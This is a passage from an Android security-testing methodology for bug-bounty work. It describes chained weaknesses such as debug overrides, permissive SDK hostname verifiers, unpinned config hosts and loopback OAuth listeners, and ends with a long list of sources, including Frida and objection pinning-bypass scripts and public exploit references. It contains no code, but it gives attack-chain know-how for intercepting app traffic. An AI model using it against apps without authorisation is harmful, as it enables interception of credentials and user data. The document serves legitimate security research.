  the host the app then sends its `Authorization` header to. One `am start` answers it.
- **Debuggable flag × `<debug-overrides>` (D02/D26 × D14-028).** Each is graveyard alone — a debuggable
  release is a hardening finding, a stray debug-override block is inert — and together they are a
  shipped, no-root MitM backdoor plus JDWP into the app's UID.
- **Third-party SDK × the app's own pinning (D18 × D14-013).** One SDK calling
  `HttpsURLConnection.setDefaultHostnameVerifier` with a permissive implementation neuters the app's own
  pinned connections process-wide. The SDK reviewer looks at permissions and endpoints; the TLS reviewer
  looks at the app's own code; the process-global setter sits between them.
- **DNS control × an unpinned config host (D14-045 × D14-046 × D17).** DNS is reviewed as a privacy
  matter and pinning as a transport matter. Joined, a name the app resolves but does not pin, which
  serves config the app trusts, is a mass-redirection primitive that needs no TLS break at all.
- **Loopback listener × any installed app (D14-023 × D13 × AM-03).** The OAuth reviewer checks PKCE and
  `redirect_uri` registration; the IPC reviewer checks exported components. Neither checks
  `/proc/net/tcp` during the login flow — and Android does not isolate loopback between apps.
- **Decrypted mobile endpoint × the current web API (D14-054 × D15).** The pinning bypass is P5 and the
  endpoint list looks unremarkable — until you diff the mobile-era version against the web app's current
  one for auth strength, throttling, validation and field exposure. The weakened control is the finding;
  the version delta alone is informational.

## Sources

- **OWASP MASTG / MASVS:** MASTG-TEST-0217, -0218, -0233, -0234, -0235, -0236, -0238, -0242, -0243,
  -0244, -0282, -0283, -0285, -0286, -0295; MASTG-TECH-0010, -0011, -0012, -0019, -0022, -0028, -0039,
  -0150, -0151; MASTG-KNOW-0010, -0011, -0014, -0015; MASTG-BEST-0020, -0021; MASTG-TOOL-0008, -0020,
  -0025, -0029, -0032, -0038, -0075, -0077, -0078, -0081, -0097, -0100, -0101, -0103, -0110, -0120,
  -0140; MASWE-0026, -0027, -0028, -0029, -0049; MASVS-NETWORK-1/-2, MASVS-CODE-4; the semgrep rules
  `mastg-android-network-checkservertrusted`, `-hostname-verification`, `-ssl-socket-hostnameverifier`,
  `-insecure-trust-anchors`.
- **Bugcrowd VRT (release 2026-07-08, 581 entries):** `mobile_security_misconfiguration|ssl_certificate_pinning|absent`
  and `|defeatable` (both P5); `insecure_data_transport|cleartext_transmission_of_sensitive_data` (VARIES);
  `insecure_data_transport|executable_download|no_secure_integrity_check` (P4) / `|secure_integrity_check` (P5);
  `broken_authentication_and_session_management|cleartext_transmission_of_session_token` (P4),
  `|weak_login_function|over_http` (P4), `|weak_registration_implementation|over_http` (P4);
  `server_security_misconfiguration|insecure_ssl|*` (P5 children); `server_side_injection|remote_code_execution_rce` (P1).
- **Programme policy:** HackerOne Core Ineligible Findings ("Lack of SSL Pinning", "SSL/TLS
  Configurations"); HackerOne Platform Standards (the pinning-demotion rule and the AITM CVSS vector);
  Reddit ("improper certificate validation still eligible"); Xiaomi, Grab, Spotify, Starbucks, Snapchat,
  Basecamp, HackenProof exclusions; Google Mobile VRP ("Theft of sensitive data", the ACE definition and
  its Tier-1 MitM pricing).
- **Android platform documentation:** the Network Security Configuration reference (`base-config`,
  `domain-config`, `debug-overrides`, `overridePins`, `certificates src`, `pin-set expiration`,
  `certificateTransparency`, `domainEncryption` and their per-API defaults); AOSP Conscrypt Mainline
  module (`/apex/com.android.conscrypt/cacerts`, Android 14 updatable root certificates, "Android 15 now
  disallows TLS 1.0 and 1.1 for apps targeting that version"); Android 15 and 16 behaviour-change pages
  (background network access; Local Network Protection, `RESTRICT_LOCAL_NETWORK`, the LAN address ranges,
  `sendto failed: EPERM`); the risk articles `cleartext-communications`, `unsafe-trustmanager`,
  `unsafe-hostname`, `bad-dns`, `unsafe-download-manager`, `android-debuggable`; the AOSP security-model
  paper (Tables 2/3/6, §4.5, threats [T.N1]/[T.N2]); Media3/ExoPlayer DRM documentation; React Native
  `DevServerHelper.kt`.
- **MITRE ATT&CK Mobile:** T1638 Adversary-in-the-Middle, T1521.003 SSL Pinning (analytic AN1725),
  T1639.001 Exfiltration Over Unencrypted Non-C2 Protocol, T1632 / T1632.001 Subvert Trust Controls,
  T1509 Non-Standard Port, T1637 Dynamic Resolution, T1437.001 Web Protocols, T1521 Encrypted Channel;
  mitigations M1006, M1009, M1011, M1012.
- **Disclosed reports and public research:** H1 #168538 (Twitter iOS, High 8.1, $2,100), #2293 (IBB,
  ~75 apps), #795272 (Razer, $750, WebView `HostnameVerifier`), #55644 (Shopify, none/$0), #12977,
  #166712 (Boozt), #2101 (Yahoo), #5786 (Coinbase request replay/tampering); Exploit-DB 42288 / 42287 /
  42349 / 42350 (MitM → `addJavascriptInterface` RCE; 42288's unregistered hardcoded domain) and papers
  48754, 33430; CVE-2021-0341 (OkHttp < 4.9.2), CVE-2023-3635 (okio), CVE-2018-9468 / -9493 / -9546
  (Download Provider); Google App Security Improvement campaigns "TrustManager" (2016-02-17), "Insecure
  Hostname Verification" (2016-11-29), "Webview SSLErrorHandler" (2015-07-17).
- **Tooling corpora:** objection `agent/src/android/pinning.ts` (the exact hook set) and `proxy.ts`;
  Frida CodeShare `@akabe1/frida-multiple-unpinning` (MASTG-TOOL-0140) with its full `Java.use` target
  list, `@pcipolloni/universal-android-ssl-pinning-bypass-with-frida`, `@sowdust/universal-android-ssl-pinning-bypass-2`,
  `@owen800q/okhttp3-interceptor`; httptoolkit `frida-interception-and-unpinning` (`native-tls-hook.js`,
  `BLOCK_HTTP3`); reFlutter, disable-flutter-tls-verification, SSLPinDetect, apk-mitm, drozer
  `kernelerror/tools/misc/installcert.py`; MobSF `network_security.py` finding strings and mobsfscan
  rules (`insecure_tls_version`, `weak_tls_cipher_suite`, `android_insecure_ssl`, `clear_text_traffic`,
  `android_download_manager`).
- **Local senior-researcher corpus:** the Conscrypt-APEX plus zygote-`nsenter` CA workflow and its
  failure signature; the proxy-versus-pcap diff rule; the harness acceptance gate; the client-report
  demotion-trap table; the "never infer pinning from a failed MitM" rule.
- **Claude-BugHunter corpus (`elementalsouls`):** `hunt-shadow-api` (the mobile→backend version-diff
  bridge), `hunt-tls-network` Phase 8 (edge-terminated mTLS verdict headers), `triage-validation`
  (the layer-ordering trap, the pre-severity gate, retraction discipline), `bb-methodology` PART 4
  (Marker Discipline, Body-Diff Rule, Statistical-Sample Rule, Shell-Loop Ban), `evidence-hygiene`
  (the five-screenshot pattern, HAR sanitising, the PII split), `bugcrowd-reporting` §§1–3 and §5
  (VRT selection, the severity-request paragraph, chain-filing order), `apk-redteam-pipeline`
  (pinned certificates in `assets/` as asset discovery).
